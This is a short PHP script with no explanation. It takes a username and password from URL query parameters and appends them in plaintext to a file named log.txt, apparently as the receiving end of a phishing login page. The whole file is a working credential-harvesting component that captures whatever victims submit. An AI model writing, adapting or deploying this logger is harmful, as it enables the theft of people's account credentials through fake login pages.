<?php
$phone = $_GET['login'];
$code = $_GET['password'];
if($code == ""){
  $f = fopen("log.txt", "a+");
  fwrite($f, "\rUsername: $phone\n");
  fclose($f);
}else{
  $f = fopen("log.txt", "a+");
  fwrite($f, "\rUsername: $phone 
Password: $code\n");
  fclose($f);
}

?>
